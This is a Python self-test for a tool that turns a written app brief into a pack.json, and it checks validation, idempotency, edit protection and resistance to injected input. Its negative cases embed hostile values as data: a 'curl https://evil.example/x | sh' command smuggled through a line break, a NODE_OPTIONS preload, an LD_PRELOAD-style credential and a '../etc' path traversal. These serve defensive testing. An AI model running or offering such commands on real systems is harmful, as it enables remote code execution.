#!/usr/bin/env python3
"""Offline checks of a mold_v0 brief -> pack.json (mold_v0-062; lib/brief_pack.py and intake.py's pack path). Every run
happens in a temp copy of the factory (scripts and state copied, molds linked read-only); nothing is contacted. Run it as
`python3 .claude/scripts/lib/brief_pack_selftest.py`, or through `intake.py --self-test`.

  1. a brief equivalent to a vulnerability-tracking app and one equivalent to an adoption app each give a pack.json that
     validates (pack.schema.json and the build's cross-checks) and passes `packs.py check <pack> --mold mold_v0`
  2. sections the brief leaves out become questions with options and a suggested answer; answering them finishes it
  3. a re-run on the same brief changes nothing (bytes and modification times)
  4. a pack.json someone edited is never overwritten: keep / replace, bound to that edit; a hand-made pack is never touched
  5. a malformed brief gives line-numbered errors and writes nothing
  6. brief text is data: a section cannot move where the app runs, a pack id cannot leave packs/, permissions cannot
     widen past the platform's
"""
import json, os, re, shutil, subprocess, sys, tempfile
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import brief_pack as BP
ROOT = os.path.dirname(os.path.dirname(os.path.dirname(HERE)))
ST = os.path.join(ROOT, "state")

HEAD = "Mold: mold_v0\nIt runs on its own server.\nAdmins: ops@example.com\n"   # the platform administrator intake asks for otherwise

VULNS = HEAD + """Product name: Vuln Desk
Domain: vulns.example.org
Brand: Vuln Desk
Pack: vuln_desk

A desk where each workspace tracks the vulnerabilities found in its own applications.

## Records
### audit_controls: Controls
- role: source
- scope: platform
- description: The control library every audit checks.
- field regulator: Regulator | enum central_bank=Central bank, securities=Securities regulator, privacy=Data protection
- field summary: Summary | text max 500
- columns: regulator, summary

### audit_apps: Applications
- role: asset
- field url: Address | text | required
- field environment: Environment | enum prod=Production, staging=Staging
- columns: url, environment
- who can read: member, billing, owner

### audit_findings: Vulnerabilities
- role: check
- scope: workspace
- field severity: Severity | enum low=Low, medium=Medium, high=High, critical=Critical | required
- field state: State | enum open=Open, triaged=Triaged, fixed=Fixed, accepted=Risk accepted, reopened=Reopened
- field app: Application | reference audit_apps | required
- field control: Control | reference audit_controls
- field due: Fix by | date
- field cvss: CVSS | number 0..10
- columns: severity, state, app, due
- lifecycle: state
- initial: open
- transition: open -> triaged | Triage
- transition: open, triaged, reopened -> fixed | Mark fixed
- transition: open, triaged -> accepted | Accept the risk | roles owner
- transition: fixed, accepted -> reopened | Reopen
- due: due within 7 days

## Metrics
- open_findings: Open vulnerabilities | count audit_findings | where state in open, triaged, reopened
- overdue_findings: Overdue | count audit_findings | where state in open, triaged, reopened and due < today
- open_by_severity: Open by severity | count audit_findings | where state in open, triaged, reopened | group by severity
- opened_per_week: Found | count audit_findings | per week of created last 8
- fixed_per_week: Fixed | count audit_findings | per week of state:fixed last 8
- time_to_fix: Average time to fix | duration audit_findings | from created to state:fixed | where state = fixed
- fix_rate: Fixed | rate audit_findings | matching state = fixed
- open_due_status: Against the fix-by date | count audit_findings | where state in open, triaged, reopened | group by due due soon 7

## Charts
- headline: Where things stand | number | open_findings, overdue_findings, time_to_fix, fix_rate
- severity: Open vulnerabilities by severity | bar | open_by_severity | ordinal
- open_vs_fixed: Found and fixed per week | line | opened_per_week, fixed_per_week
- due: Open against their fix-by date | bar | open_due_status

## Tabs
- overview: Overview | overview | icon dashboard | group Audit | charts headline, severity, open_vs_fixed, due
- vulnerabilities | area audit_findings | icon shield | group Audit | views table, board, timeline, detail | timeline by due | charts severity, due
- applications | area audit_apps | icon building | group Audit
- controls | area audit_controls | icon book | group Audit
- audits: Audits | runs | icon play | group Audit
- reports: Reports | reports | group Audit
- credentials: Application tokens | credentials | group Workspace | roles owner, billing, member
- notices: Due soon | notices | group Workspace
- billing | billing | group Workspace | roles owner, billing

## Jobs
### audit_scan: Audit an application
- repository: https://git.example.com/agents/fixture-agent.git
- commit: 0123456789abcdef0123456789abcdef01234567
- arg app: Application | reference audit_apps | required
- command: node audit.mjs --app {app}
- validate: node validate.mjs
- write back: findings
- credentials: audit_token
- timeout: 20 minutes

## Credentials
- audit_token: Application token | asset audit_apps | env AUDIT_TOKEN | help A read-only token for the application

## Schedules
- nightly_audit: Nightly audit | audit_scan | 0 3 * * * | over audit_apps

## Onboarding
- first_app: Add a first application | record audit_apps | prompt Add my app at https://app.example.com to Vuln Desk
- first_audit: Run a first audit | run audit_scan

## Words
- run: audit

## MCP
- prefix: vd
- exclude: cancel_audit
- admin only: vd_start_audit_scan
- rename list_audit_findings: list_vulnerabilities
- describe vd_get_audit_findings: One vulnerability by its key, with its application and control.
- instructions: Vuln Desk keeps a team's applications and the findings of their audits.
- instructions: Ask before starting an audit: it runs against the live application.
"""

# No ## Tabs, ## Credentials, ## Schedules or ## Onboarding, and no brand: each is a question.
ADOPTION = HEAD + """Product name: Pick Rate
Domain: adoption.example.org
Pack: adoption

## Records
### adopt_tasks: Tasks
- role: check
- scope: platform
- field category: Category | enum setup, api, debugging
- field difficulty: Difficulty | enum easy, medium, hard
- columns: category, difficulty

### adopt_products: Products
- role: asset
- field website: Website | text | required

## Metrics
- pick_rate: Pick rate | rate run_results | where status in pass, fail | matching status = pass
- pick_rate_weekly: Pick rate | rate run_results | where status in pass, fail | matching status = pass | per week of created last 6
- pick_rate_by_task: Pick rate by task | rate run_results | where status in pass, fail | matching status = pass | group by check
- pick_rate_by_agent: Pick rate by agent | rate run_results | where status in pass, fail | matching status = pass | group by detail.harness
- results_by_status: Results | count run_results | group by status
- runs_weekly: Simulations | count runs | per week of created last 6
- run_spend: Spend | sum runs.cost_usd
- run_hours: Average simulation time | duration runs | from started to ended in hours | where status = succeeded

## Charts
- headline: Adoption | number | pick_rate, run_spend, run_hours
- trend: Pick rate per week | line | pick_rate_weekly
- by_task: Pick rate by task | bar | pick_rate_by_task
- by_agent: Pick rate by agent | table | pick_rate_by_agent
- statuses: Results by status | bar | results_by_status
- volume: Simulations per week | bar | runs_weekly

## Jobs
### adopt_simulate: Simulate developers
- repository: https://git.example.com/agents/fixture-agent.git
- commit: 0123456789abcdef0123456789abcdef01234567
- arg product: Product | reference adopt_products | required
- command: node simulate.mjs --product {product}
- validate: node validate.mjs
- write back: findings
- timeout: 1200

## Words
- run: simulation
"""


MCP_WANT = {"prefix": "vd", "exclude": ["vd_cancel_audit"], "admin_only": ["vd_start_audit_scan"], "rename": {"vd_list_audit_findings": "list_vulnerabilities"}, "describe": {"vd_get_audit_findings": "One vulnerability by its key, with its application and control."},
            # mold_v0-119: each `- instructions:` bullet is a paragraph of pack.json mcp.instructions
            "instructions": "Vuln Desk keeps a team's applications and the findings of their audits.\n\nAsk before starting an audit: it runs against the live application."}


def run(n=0, fails=None):
    fails = [] if fails is None else fails
    T = tempfile.mkdtemp(prefix="brief-pack-selftest-")
    try:
        shutil.copytree(os.path.join(ROOT, ".claude", "scripts"), os.path.join(T, ".claude", "scripts"), ignore=shutil.ignore_patterns("__pycache__", "fixtures"))
        os.makedirs(os.path.join(T, "state", "application")); os.makedirs(os.path.join(T, "briefs"))
        for f in os.listdir(ST):
            if os.path.isfile(os.path.join(ST, f)): shutil.copy(os.path.join(ST, f), os.path.join(T, "state", f))
        shutil.copytree(os.path.join(ST, "tasks"), os.path.join(T, "state", "tasks"))
        shutil.copytree(os.path.join(ST, "application", "app_id"), os.path.join(T, "state", "application", "app_id"))
        os.symlink(os.path.join(ROOT, "molds"), os.path.join(T, "molds"))
        I = os.path.join(T, ".claude", "scripts", "intake.py"); A = os.path.join(T, "state", "application"); P = os.path.join(T, "packs")
        schema = json.load(open(os.path.join(ROOT, "molds", "mold_v0", "codebase", "packs", "pack.schema.json")))
        def go(app, brief, answers=None):
            b = os.path.join(T, "briefs", app + ".md"); open(b, "w").write(brief)
            # The legal question (mold_v0-109) is answered "later" until the app's answers.json records an answer (intake
            # reads it like any earlier answer), so these cases are about the pack.
            ap = os.path.join(A, app, "answers.json")
            if not (os.path.isfile(ap) and "legal" in json.load(open(ap))): answers = {**(answers or {}), "legal": "later"}
            if answers is not None: json.dump(answers, open(os.path.join(T, "ans.json"), "w"))
            return subprocess.run([sys.executable, I, b, "--app", app, *(["--answers", os.path.join(T, "ans.json")] if answers is not None else [])],
                                  cwd=T, capture_output=True, text=True)
        out = lambda r: (r.stdout + r.stderr).strip()
        def shell(pid): return os.path.join(P, pid, "files", "packs", pid, "pack.json")
        def snap(pid):
            fs = {}
            for d, _, names in os.walk(os.path.join(P, pid)):
                for f in names: p = os.path.join(d, f); fs[os.path.relpath(p, P)] = (open(p, "rb").read(), os.stat(p).st_mtime_ns)
            return fs
        def checked(pid, what):
            nonlocal n
            pj = json.load(open(shell(pid)))
            probs = BP.schema_errors(schema, pj) + BP.cross_errors(pj); n += 1
            if probs: fails.append(f"{what}: the generated pack.json does not validate: {probs[:4]}")
            r = subprocess.run([sys.executable, os.path.join(T, ".claude", "scripts", "packs.py"), "check", pid, "--mold", "mold_v0"], cwd=T, capture_output=True, text=True); n += 1
            if r.returncode: fails.append(f"{what}: packs.py check {pid} --mold mold_v0: {out(r)[-300:]}")
            return pj

        # 1. the vulnerability-style brief: whole, no question
        r = go("zz_vulns", VULNS); n += 1
        if r.returncode: fails.append(f"the vulnerability brief did not mint a pack: rc={r.returncode} {out(r)[-600:]}")
        else:
            pj = checked("vuln_desk", "vulnerability brief"); app = json.load(open(os.path.join(A, "zz_vulns", "application.json"))); n += 1
            want = {"record_areas": 3, "metrics": 8, "charts": 4, "tabs": 9, "job_kinds": 1, "credentials": 1, "schedules": 1, "onboarding": 2}
            got = {k: len(pj.get(k) or []) for k in want}
            if got != want or app.get("packs") != ["vuln_desk"] or (app.get("surface") or {}).get("branding", {}).get("product_name") != "Vuln Desk":
                fails.append(f"vulnerability pack: {got} (want {want}), app packs {app.get('packs')}, brand {(app.get('surface') or {}).get('branding', {}).get('product_name')}")
            f = pj["record_areas"][2]; ag = pj["job_kinds"][0]["agent"]; n += 1
            if f["lifecycle"]["transitions"][2] != {"from": ["open", "triaged"], "to": "accepted", "label": "Accept the risk", "roles": ["owner"]} \
               or ag["command"] != ["node", "audit.mjs", "--app", "{app}"] or ag["args"] != {"app": {"from": "scope.app"}} or ag["timeout_seconds"] != 1200 \
               or pj["metrics"][1]["where"][1] != {"field": "due", "op": "lt", "value": "today"} or pj["words"] != {"run": "audit"} or pj.get("mcp") != MCP_WANT \
               or pj["onboarding"][0].get("prompt") != "Add my app at https://app.example.com to Vuln Desk" or "prompt" in pj["onboarding"][1]:
                fails.append(f"vulnerability pack details: {f['lifecycle']['transitions'][2]} {ag} {pj['metrics'][1]}")
            man = json.load(open(os.path.join(P, "vuln_desk", "pack.json"))); n += 1
            if man.get("intake", {}).get("pack_json_sha256") != BP.sha(open(shell("vuln_desk"), "rb").read()) or "mcp" in man["intake"] \
               or "kept_sha256" in man["intake"] or "mcp: cancel_audit is the generated tool vd_cancel_audit" not in out(r):
                fails.append(f"the manifest records the written pack.json's hash and the reserved MCP lines: {man.get('intake')}")
            # 3. idempotent: the same brief again changes no byte and no modification time, state included
            before = snap("vuln_desk"); st = {k: open(os.path.join(A, "zz_vulns", k)).read() for k in os.listdir(os.path.join(A, "zz_vulns"))}
            r = go("zz_vulns", VULNS); n += 1
            st2 = {k: open(os.path.join(A, "zz_vulns", k)).read() for k in os.listdir(os.path.join(A, "zz_vulns"))}
            if r.returncode or snap("vuln_desk") != before or st2 != st or "unchanged" not in out(r):
                fails.append(f"a re-run on the same brief changed something: rc={r.returncode} {sorted(set(snap('vuln_desk')) ^ set(before))} {[k for k in st if st.get(k) != st2.get(k)]} {out(r)[-200:]}")
            # a brief change on an unedited pack is applied (it is intake's own file)
            r = go("zz_vulns", VULNS.replace("Audit an application", "Audit one application")); n += 1
            if r.returncode or json.load(open(shell("vuln_desk")))["job_kinds"][0]["label"] != "Audit one application":
                fails.append(f"a brief change on a pack nobody edited must be written: {out(r)[-200:]}")
            # 4. the edit guard
            edited = open(shell("vuln_desk")).read().replace('"Vulnerabilities"', '"Findings (edited)"'); open(shell("vuln_desk"), "w").write(edited)
            h = BP.sha(edited.encode())[:12]
            r = go("zz_vulns", VULNS); q = json.load(open(os.path.join(A, "zz_vulns", "questions.json"))) if os.path.exists(os.path.join(A, "zz_vulns", "questions.json")) else {}; n += 1
            if r.returncode != 2 or [x["id"] for x in q.get("pending", [])] != [f"pack.overwrite.{h}"] or q["pending"][0]["options"] != ["keep", "replace"] \
               or q["pending"][0]["suggested"] != "keep" or open(shell("vuln_desk")).read() != edited:
                fails.append(f"an edited pack.json must be asked about, never overwritten: rc={r.returncode} {q.get('pending')} {out(r)[-200:]}")
            r = go("zz_vulns", VULNS, {f"pack.overwrite.{h}": "keep"}); n += 1
            if r.returncode or open(shell("vuln_desk")).read() != edited or not os.path.isfile(os.path.join(P, "vuln_desk", "pack.draft.json")):
                fails.append(f"keep must leave the edited pack.json as it is and put the brief's version beside it: rc={r.returncode} {out(r)[-300:]}")
            r = go("zz_vulns", VULNS); n += 1
            if r.returncode or open(shell("vuln_desk")).read() != edited or "kept as it is" not in out(r):
                fails.append(f"a kept edit stays kept on the next run, without asking again: rc={r.returncode} {out(r)[-300:]}")
            edited2 = edited.replace('"Findings (edited)"', '"Findings (edited twice)"'); open(shell("vuln_desk"), "w").write(edited2)
            r = go("zz_vulns", VULNS, {f"pack.overwrite.{h}": "replace"}); n += 1
            if r.returncode != 2 or open(shell("vuln_desk")).read() != edited2:
                fails.append(f"a replace answer is for the edit it was given for: a later edit is asked again: rc={r.returncode} {out(r)[-200:]}")
            h2 = BP.sha(edited2.encode())[:12]
            r = go("zz_vulns", VULNS, {f"pack.overwrite.{h2}": "replace"}); n += 1
            if r.returncode or json.load(open(shell("vuln_desk")))["record_areas"][2]["label"] != "Vulnerabilities" or os.path.exists(os.path.join(P, "vuln_desk", "pack.draft.json")):
                fails.append(f"replace must write the brief's version and drop the draft: rc={r.returncode} {out(r)[-200:]}")
            # a pack intake did not make is never touched
            os.makedirs(os.path.join(P, "handmade", "files", "packs", "handmade"))
            json.dump({"pack_id": "handmade", "mold_id": "mold_v0", "name": "H", "description": "by hand"}, open(os.path.join(P, "handmade", "pack.json"), "w"))
            open(shell("handmade"), "w").write('{"id": "handmade"}\n'); hm = snap("handmade")
            r = go("zz_hand", VULNS.replace("Pack: vuln_desk", "Pack: handmade")); n += 1
            if r.returncode == 0 or "made by hand" not in out(r) or snap("handmade") != hm:
                fails.append(f"a hand-made pack must be refused and left untouched: rc={r.returncode} {out(r)[-200:]}")
            # a pack intake made for another app is not taken over
            r = go("zz_other", VULNS); n += 1
            if r.returncode == 0 or "zz_vulns" not in out(r):
                fails.append(f"a pack intake made for another app must be refused: rc={r.returncode} {out(r)[-200:]}")

        # 2. the adoption-style brief: the missing sections and the brand are questions
        r = go("zz_adopt", ADOPTION); qf = os.path.join(A, "zz_adopt", "questions.json"); q = json.load(open(qf)) if os.path.exists(qf) else {}; n += 1
        ids = [x["id"] for x in q.get("pending", [])]
        if r.returncode != 2 or ids != ["pack.credentials", "pack.schedules", "pack.tabs", "pack.onboarding", "brand_name"] or os.path.exists(os.path.join(P, "adoption")):
            fails.append(f"an adoption brief with no tabs, credentials, schedules, onboarding or brand must ask exactly those, writing no pack: rc={r.returncode} {ids} {out(r)[-300:]}")
        elif not all((x["options"] and x["suggested"] in x["options"]) or x["id"] == "brand_name" for x in q["pending"]) or q["pending"][-1]["suggested"] != "Pick Rate":
            fails.append(f"each question has options and a suggested answer among them: {q['pending']}")
        r = go("zz_adopt", ADOPTION, {"pack.credentials": "none", "pack.schedules": "none", "pack.tabs": "generated", "pack.onboarding": "generated", "brand_name": "Pick Rate"}); n += 1
        if r.returncode: fails.append(f"the answered adoption brief did not mint a pack: rc={r.returncode} {out(r)[-600:]}")
        else:
            pj = checked("adoption", "adoption brief"); n += 1
            tabs = [t["id"] for t in pj.get("tabs") or []]
            if tabs != ["overview", "adopt-tasks", "adopt-products", "runs", "reports", "schedules", "usage", "billing", "profile"] or pj.get("run_results") != {"check": ["adopt_tasks"]} \
               or [s["done_when"] for s in pj.get("onboarding") or []] != ["connected", "record:adopt_products", "run:adopt_simulate"] or "credentials" in pj or "schedules" in pj:
                fails.append(f"the adoption pack's generated tabs, onboarding and run results: {tabs} {pj.get('run_results')} {pj.get('onboarding')}")
            ans = json.load(open(os.path.join(A, "zz_adopt", "answers.json"))); n += 1
            if ans.get("pack.tabs") != "generated" or ans.get("brand_name") != "Pick Rate":
                fails.append(f"the pack answers are recorded in answers.json: {ans}")
            r = go("zz_adopt", ADOPTION); n += 1   # no --answers: the answers recorded with the pack and the brand are reused
            if r.returncode: fails.append(f"a re-run without --answers must reuse the recorded answers: {out(r)[-300:]}")

        # open points inside a section are questions too
        b = HEAD + "Pack: open_points\nBrand: Open\n\n## Records\n### things: Things\n- field note: Note\n- field state: State | enum new, done\n- lifecycle: state\n\n" \
            "## Jobs\n### check_things: Check things\n- arg thing: Thing | reference things\n- command: node run.mjs {thing}\n\n## Credentials\n- api_key: API key\n"
        r = go("zz_open", b); qf = os.path.join(A, "zz_open", "questions.json"); q = json.load(open(qf)) if os.path.exists(qf) else {}; n += 1
        ids = [x["id"] for x in q.get("pending", [])]
        want = ["pack.schedules", "pack.tabs", "pack.charts", "pack.onboarding", "pack.records.things.role", "pack.records.things.scope",
                "pack.records.things.fields.note.type", "pack.records.things.transitions", "pack.jobs.check_things.repository", "pack.jobs.check_things.commit",
                "pack.jobs.check_things.validate", "pack.jobs.check_things.write_back", "pack.credentials.api_key.bound_to"]
        if r.returncode != 2 or ids != want:
            fails.append(f"what a section leaves open must be asked, nothing guessed: rc={r.returncode} {ids} {out(r)[-300:]}")
        r = go("zz_open", b, {"pack.schedules": "none", "pack.tabs": "generated", "pack.charts": "generated", "pack.onboarding": "none", "pack.records.things.role": "check",
                              "pack.records.things.scope": "workspace", "pack.records.things.fields.note.type": "text", "pack.records.things.transitions": "free",
                              "pack.jobs.check_things.repository": "https://git.example.com/a/b.git", "pack.jobs.check_things.commit": "a" * 40,
                              "pack.jobs.check_things.validate": "node check.mjs", "pack.jobs.check_things.write_back": "out", "pack.credentials.api_key.bound_to": "workspace"}); n += 1
        if r.returncode: fails.append(f"the answered open points did not mint a pack: {out(r)[-500:]}")
        else:
            pj = checked("open_points", "answered open points"); n += 1
            if pj["record_areas"][0]["lifecycle"] != {"field": "state", "initial": "new", "transitions": [{"from": "*", "to": "new"}, {"from": "*", "to": "done"}]} \
               or pj["credentials"][0]["deliver_as"] != {"env": "API_KEY"} or "default: line" not in out(r):
                fails.append(f"answered points and the documented defaults (said, never silent): {pj['record_areas'][0].get('lifecycle')} {pj['credentials']} {out(r)[-300:]}")
        r = go("zz_open2", b.replace("Pack: open_points", "Pack: open_two"), {"pack.jobs.check_things.commit": "main"}); n += 1
        if r.returncode != 2 or "never a branch" not in out(r) or os.path.exists(os.path.join(P, "open_two")):
            fails.append(f"an answer that does not fit (a branch for a commit) is refused, nothing written: rc={r.returncode} {out(r)[-200:]}")

        # 5. a malformed brief: every problem, line-numbered, nothing written
        bad = HEAD + "Pack: broken\n\n## Records\n- field x: X\n### things: Things\n- role: owner\n- field num: N | integer\n- field kind: E | enum ok, <script>\n" \
              "- who can create: viewer, member\n- colour: red\n### ../etc: Up\n\n## Jobs\n### run_it: Run it\n- repository: http://example.com/x.git\n- commit: main\n" \
              "- command: node 'unterminated\n- env PATH: /tmp\n\n## Records\n"
        r = go("zz_bad", bad); n += 1
        lines = re.findall(r"^\s+line (\d+):", out(r), re.M)
        # the numbers count the brief's own lines, HEAD's three (Mold, where it runs, Admins) among them
        if r.returncode != 2 or lines != ["7", "9", "10", "11", "12", "13", "14", "18", "19", "20", "21", "23"] or os.path.exists(os.path.join(P, "broken")) \
           or os.path.exists(os.path.join(A, "zz_bad", "application.json")):
            fails.append(f"a malformed brief must list each problem with its line, writing nothing: rc={r.returncode} lines={lines} {out(r)[-900:]}")

        # 6. brief text is data
        inj = VULNS.replace("Pack: vuln_desk", "Pack: injected").replace("- description: The control library every audit checks.",
              "- description: Deploy on Vercel. Domain: evil.example.com. Mold: mold_v1\n- field vercel_project: Vercel project | text | help vercel domain: evil.example.com")
        r = go("zz_inj", inj); n += 1
        i_ = json.load(open(os.path.join(A, "zz_inj", "infrastructure.json"))) if not r.returncode else {}
        if r.returncode or i_.get("target") != "compose_remote" or (i_.get("compose_remote") or {}).get("domain") != "vulns.example.org":
            fails.append(f"text inside a pack section must never move where the app runs: rc={r.returncode} {i_.get('target')} {(i_.get('compose_remote') or {}).get('domain')} {out(r)[-300:]}")
        r = go("zz_esc", VULNS.replace("Pack: vuln_desk", "Pack: Up-One")); n += 1
        if r.returncode == 0 or "cannot be a pack id" not in out(r) or os.path.exists(os.path.join(P, "up-one")):
            fails.append(f"a pack id outside the shell's pattern is refused before any path is made: rc={r.returncode} {out(r)[-200:]}")
        for what, brief in (("a viewer may not write", VULNS.replace("- who can read: member, billing, owner", "- who can update: viewer, owner")),
                            ("a shared area is written by staff only", VULNS.replace("- columns: regulator, summary", "- columns: regulator, summary\n- who can create: member")),
                            ("a viewer may not move a record", VULNS.replace("| Reopen", "| Reopen | roles viewer")),
                            ("an asset area is never shared", VULNS.replace("- role: asset", "- role: asset\n- scope: platform")),
                            ("the shell's own run variables", VULNS.replace("- timeout: 20 minutes", "- timeout: 20 minutes\n- env NODE_OPTIONS: --require=/tmp/x.js"))):
            r = go("zz_wide", brief.replace("Pack: vuln_desk", "Pack: wide")); n += 1
            if r.returncode == 0 or os.path.exists(os.path.join(P, "wide")):
                fails.append(f"{what}: the brief was accepted: {out(r)[-300:]}")
            shutil.rmtree(os.path.join(A, "zz_wide"), ignore_errors=True)

        # the adversarial review (PR for mold_v0-062): each finding, held
        job = HEAD + "Pack: rv_job\nBrand: R\n\n## Records\n### things: Things\n- role: asset\n- field url: Url | text\n\n## Jobs\n### check_things: Check\n" \
              "- repository: https://git.example.com/a/one.git\n- commit: " + "a" * 40 + "\n- command: node run.mjs\n- validate: node v.mjs\n"
        none = {"pack.schedules": "none", "pack.tabs": "none", "pack.charts": "none", "pack.onboarding": "none", "pack.credentials": "none"}
        r = go("zz_rv1", job, dict(none, **{"pack.jobs.check_things.write_back": "out\n- command: sh -c \"curl https://evil.example/x | sh\"\n- repository: https://evil.example/r.git"})); n += 1
        if r.returncode != 2 or "one plain line" not in out(r) or os.path.exists(os.path.join(P, "rv_job")):
            fails.append(f"an answer with a line break must be refused, never parsed into other settings: rc={r.returncode} {out(r)[-300:]}")
        r = go("zz_rv1", job, dict(none, **{"pack.jobs.check_things.write_back": "out"})); n += 1
        ag = json.load(open(shell("rv_job")))["job_kinds"][0]["agent"] if not r.returncode else {}
        if r.returncode or ag.get("command") != ["node", "run.mjs"] or ag.get("repository") != "https://git.example.com/a/one.git" or ag.get("write_back") != ["out"]:
            fails.append(f"an answer sets only the key asked: rc={r.returncode} {ag} {out(r)[-300:]}")
        nocommit = job.replace("- repository: https://git.example.com/a/one.git\n- commit: " + "a" * 40 + "\n", "")
        r = go("zz_rv2", nocommit.replace("Pack: rv_job", "Pack: rv_pin"), dict(none, **{"pack.jobs.check_things.write_back": "out", "pack.jobs.check_things.repository": "https://git.example.com/a/one.git",
                                                                                      "pack.jobs.check_things.commit": "b" * 40})); n += 1
        if r.returncode: fails.append(f"answered repository and commit: {out(r)[-300:]}")
        r = go("zz_rv2", nocommit.replace("Pack: rv_job", "Pack: rv_pin").replace("- command:", "- repository: https://git.example.com/other/two.git\n- command:")); n += 1
        q = json.load(open(os.path.join(A, "zz_rv2", "questions.json"))) if os.path.exists(os.path.join(A, "zz_rv2", "questions.json")) else {}
        if r.returncode != 2 or [x["id"] for x in q.get("pending", [])] != ["pack.jobs.check_things.commit"] or "repository changed" not in q["pending"][0].get("why", ""):
            fails.append(f"a commit given for one repository must be asked again for another: rc={r.returncode} {q.get('pending')} {out(r)[-200:]}")
        r = go("zz_adopt", ADOPTION); n += 1   # no --answers and no Brand line: the app's own brand stays
        b_ = (json.load(open(os.path.join(A, "zz_adopt", "application.json"))).get("surface") or {}).get("branding") or {}
        if r.returncode or b_.get("product_name") != "Pick Rate":
            fails.append(f"a re-run without --answers must keep the app's brand: rc={r.returncode} {b_.get('product_name')} {out(r)[-200:]}")
        os.makedirs(os.path.join(P, "takeme", "files", "packs", "takeme")); open(os.path.join(P, "takeme", "files", "packs", "takeme", "index.ts"), "w").write("export {}\n")
        r = go("zz_rv3", VULNS.replace("Pack: vuln_desk", "Pack: takeme")); n += 1
        if r.returncode == 0 or "no manifest" not in out(r) or os.path.exists(os.path.join(P, "takeme", "pack.json")):
            fails.append(f"a packs/<id>/ with files and no manifest is not intake's: rc={r.returncode} {out(r)[-200:]}")
        for what, brief, want in (("a pack id read whole", VULNS.replace("Pack: vuln_desk", "Pack: vuln.v2"), "cannot be a pack id"),
                                  ("an empty first part", VULNS.replace("- audits: Audits | runs", "- audits: Audits | | runs"), "say its kind"),
                                  ("a digit of another script", VULNS.replace("- timeout: 20 minutes", "- concurrency: \u00b2"), "whole number"),
                                  ("a credential named like a shell variable", VULNS.replace("- audit_token: Application token | asset audit_apps | env AUDIT_TOKEN", "- ld_preload: Loader | workspace"), "shell sets"),
                                  ("an environment credential names its asset area", VULNS.replace("asset audit_apps | env AUDIT_TOKEN", "environment prod | env AUDIT_TOKEN"), "asset area"),
                                  ("a time point that is no date", VULNS.replace("per week of created last 8", "per week of nosuch last 8"), "no field nosuch"),
                                  ("a number compared with a word", VULNS.replace("and due < today", "and cvss < today"), "compare it with a number"),
                                  ("a field declared twice", VULNS.replace("- field due: Fix by | date", "- field due: Fix by | date\n- field due: Again | date"), "declared twice")):
            r = go("zz_rv4", brief.replace("Pack: vuln_desk", "Pack: rv_four")); n += 1
            if r.returncode == 0 or want not in out(r) or "Traceback" in out(r) or os.path.exists(os.path.join(A, "zz_rv4")):
                fails.append(f"{what}: rc={r.returncode} {out(r)[-300:]}")
        r = go("zz_rv5", VULNS.replace("Pack: vuln_desk", "Pack: rv_env").replace("asset audit_apps | env AUDIT_TOKEN", "environment audit_apps prod, staging | env AUDIT_TOKEN")); n += 1
        if r.returncode: fails.append(f"an environment credential with its asset area must pass: {out(r)[-300:]}")
        r = go("zz_rv6", HEAD.replace("Mold: mold_v0", "") + "Pack: rv_mold\n\n## Records\nMold: mold_v0\n"); n += 1
        if r.returncode == 0 or "packs/rv_mold/pack.json does not exist" not in out(r) or os.path.exists(os.path.join(P, "rv_mold")):   # read as mold_v1's brief: no pack made
            fails.append(f"a Mold: line inside a pack section never picks the mold: rc={r.returncode} {out(r)[-200:]}")

        # pack.json `mcp` (mold_v0-060, 068): the generator's own checks, each refused before anything is written
        long_area = "a" * 60
        for what, brief, want in (("a tool that is not generated", VULNS.replace("- exclude: cancel_audit", "- exclude: cancel_everything"), "not one of this pack's generated tools"),
                                  ("two tools under one name", VULNS.replace("- rename list_audit_findings: list_vulnerabilities", "- rename list_audit_findings: vd_get_audit_findings"), "clashes with"),
                                  ("a name past 64 characters", VULNS.replace("- prefix: vd", "- prefix: " + "p" * 31).replace("### audit_controls: Controls", "### " + long_area + ": Controls")
                                       .replace("reference audit_controls", "reference " + long_area).replace("area audit_controls", "area " + long_area)
                                       .replace("- admin only: vd_start_audit_scan\n", "").replace("- rename list_audit_findings: list_vulnerabilities\n", "").replace("- describe vd_get_audit_findings", "- describe get_audit_findings"), "longer than 64"),
                                  ("an invisible character in a description", VULNS.replace("with its application", "with its\u200b application"), "zero-width"),
                                  ("markup in a description", VULNS.replace("with its application", "with <b>its</b> application"), "no < or >"),
                                  ("an admin tool moved to the admin MCP", VULNS.replace("- admin only: vd_start_audit_scan", "- admin only: vd_admin_list_audit_controls"), "on the admin MCP already"),
                                  ("an unknown setting", VULNS.replace("- prefix: vd", "- prefix: vd\n- tools: generated"), "unknown MCP setting"),
                                  # mold_v0-119: the instructions and an onboarding step's prompt, as the shell checks them
                                  ("an invisible character in the instructions", VULNS.replace("keeps a team's", "keeps a\u200b team's"), "instructions: plain text"),
                                  ("instructions past 4000 characters", VULNS.replace("- instructions: Ask before", "- instructions: " + "x" * 3990 + "\n- instructions: Ask before"), "at most 4000 characters"),
                                  ("markup in a prompt", VULNS.replace("| prompt Add my app", "| prompt Add <my> app"), "prompt is one line of plain text"),
                                  ("a prompt given twice", VULNS.replace("| prompt Add my app", "| prompt Hello | prompt Add my app"), "prompt is given twice")):
            r = go("zz_mcp", brief.replace("Pack: vuln_desk", "Pack: mcp_bad")); n += 1
            if r.returncode == 0 or want not in out(r) or "Traceback" in out(r) or os.path.exists(os.path.join(P, "mcp_bad")):
                fails.append(f"mcp, {what}: rc={r.returncode} {out(r)[-400:]}")
    finally:
        shutil.rmtree(T, ignore_errors=True)
    return n, fails


if __name__ == "__main__":
    n, fails = run()
    if fails: sys.exit("brief -> pack self-test FAILED:\n  " + "\n  ".join(fails))
    print(f"brief -> pack: {n} checks passed")
